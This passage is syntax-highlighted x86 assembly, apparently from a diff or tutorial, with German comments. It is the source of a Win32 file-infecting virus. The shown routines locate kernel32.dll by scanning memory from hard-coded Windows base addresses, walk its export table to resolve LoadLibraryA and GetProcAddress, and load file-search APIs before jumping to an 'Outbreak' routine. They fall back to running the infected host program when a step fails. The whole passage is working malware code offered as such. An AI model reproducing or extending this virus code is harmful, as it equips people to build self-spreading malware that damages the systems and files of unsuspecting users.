+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0BFF70000h</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Win95 Kernel Adresse testen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> GetKernel<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jnc</span> GetApis<br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">077F00000h</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; WinNT Kernel Addy</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> GetKernel<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jnc</span> GetApis<br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">077e00000h</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Win2k Kernel Addy</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> GetKernel<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jnc</span> GetApis<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wenn wir den Kernel immernoch nicht </span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> ExecuteHost &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; gefunden haben starten wir die infizierte Datei</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ---------------[ Suchen nach der Adresse des Kernels ]---------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+GetKernel<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wir suchen nach dem Kernel</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir durchsuchen maximal 5 Pages</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>K32Trys<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">5h</span><br/>
+<br/>
+GK1<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>K32Trys<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> NoKernel &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Sind wir an unserem Limit vorbei ?</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> CheckMZSign &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Hat diese Page einen EXE-Header ( Stub )</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jnc</span> CheckPE<br/>
+<br/>
+GK2<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">sub</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">10000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Suchen nach der nächsten Page</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">dec</span> <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>K32Trys<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> GK1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Start des Tests</span><br/>
+<br/>
+CheckPE<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Testen ob es auch eine Win32Bit EXE ist</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; da die Kernel32.dll auch eine PE-EXE ist</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> CheckPESign<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jnc</span> CheckDLL &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; nun testen wir noch ob wir eine DLL gefunden haben</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> GK2<br/>
+<br/>
+CheckDLL<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">16h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; suchen nach dem Flag</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: black;">&#93;</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Characteristics laden</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">and</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0F000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; DLL Flag raussuchen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">02000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; und testen ob es gesetzt ist</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jne</span> GK2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; wenn es keine DLL ist suchen wir weiter</span><br/>
+&nbsp;<br/>
+KernelFound<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wir haben den Kernel gefunden !</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">sub</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">16h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; edi wird auf den PE - Header gesetzt</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xchg</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; PE Adresse wird in eax gespeichert</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xchg</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; MZ Adresse in ebx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">clc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; löschen des Carriage Flags</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Rückkehr</span><br/>
+<br/>
+NoKernel<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wenn wir den Kernel nicht gefunden haben,</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">stc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; löschen wir das Carriage Flag und beenden die Prozedur</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<br/>
+&nbsp;K32Trys &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">5h</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Suchweite</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; -------------------------[ Suchen nach den API's ]-------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+&nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Diese 2 API's suchen wir im Kernel.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir brauchen diese beiden um alle anderen APIs zu ermitteln</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Ich bevorzuge LoadLibraryA zu GetModuleHandle, </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; weil es nun nicht mehr nötig ist, das die infizierte Datei</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; auch API's aus den DLL's die wir brauchen läd, denn</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir laden sie selbst,... ;)</span><br/>
+<br/>
+&nbsp;LL &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'LoadLibraryA'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0h</span> <span style="color: black; font-style: italic;">; Diese beiden API's suchen wir</span><br/>
+&nbsp;GPA <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'GetProcAddress'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0h</span> <br/>
+<br/>
+GetApis<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Offset des Kernel32.dll PE-Headers ist in EAX</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>KernelAddy<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> <span style="color: black; font-style: italic;">; Speichern</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MZAddy<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>LL<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Zeiger auf den Namen der LoadLibaryA - API</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0Ch</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Länge des Namens</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> SearchAPI1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; such ihn !</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XLoadLibraryA<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Adresse speichern</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xchg</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wenn wir einen der beiden API's nicht ermitteln können</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jecxz</span> ExecuteHost &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; starten wir das infizierte Prog</span><br/>
+&nbsp; &nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>GPA<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Name der GetProcAddress - API</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0Eh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Länge</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> SearchAPI1<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XGetProcAddress<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xchg</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; testen ob wir ihn haben</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jecxz</span> ExecuteHost<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Nun haben wir alle API's die wir brauchen und können</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> GetAPI2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; alle anderen ermitteln</span><br/>
+<br/>
+<br/>
+&nbsp;KERNEL32 &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'Kernel32'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> <span style="color: black; font-style: italic;">; jaja, den jump hätte man weglassen können, aber so ist</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; es übersichtlicher !</span><br/>
+<br/>
+GetAPI2<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wir bekommen die anderen API's durch das ermitteln der</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; DLL um dann die API's selber zu lokalisieren</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir ermitteln die Handles durch</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Aufruf der LoadLibrary API.. :)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; falls das schiefläuft starten wir</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; die Originaldatei </span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>KERNEL32<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XLoadLibraryA<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>K32Handle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">test</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> ExecuteHost<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>Kernel32Names<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XFindFirstFileA<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>K32Handle<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> NumberOfKernel32APIS<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> GetAPI3<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> Outbreak<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ---------[ Durchsuchen der Kernel Export Table nach API's ]----------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+<br/>
+SearchAPI1<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; In dieser Prozedur suchen wir nach den 2 Hauptapi's</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Counter löschen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">and</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>counter<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0h</span><br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>KernelAddy<span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">; PE-Header Offset laden</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #ff0000;">78h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Export Table Address ermitteln</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MZAddy<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; aus der relativen Adresse eine absolute machen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1Ch</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; nicht benötigten Daten werden übersprungen</span><br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lodsd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Die Address Table ermitteln</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MZAddy<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; zu einem absoluten Wert umrechnen und speichern</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>ATableVA<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lodsd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Name Pointer Table ermitteln,</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MZAddy<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; umrechnen und speichern</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>NTableVA<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lodsd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Ordinal Table ermitteln,</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MZAddy<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; und... rate mal ;)</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>OTableVA<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>NTableVA<span style="color: black;">&#93;</span> &nbsp; <span style="color: black; font-style: italic;">; Name Pointer Table Addy in esi laden</span><br/>
+<br/>
+SearchNextApi1<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; auf den Stack legen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lodsd</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MZAddy<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; und auf eine absolute Adresse umrechnen</span><br/>
+<br/>
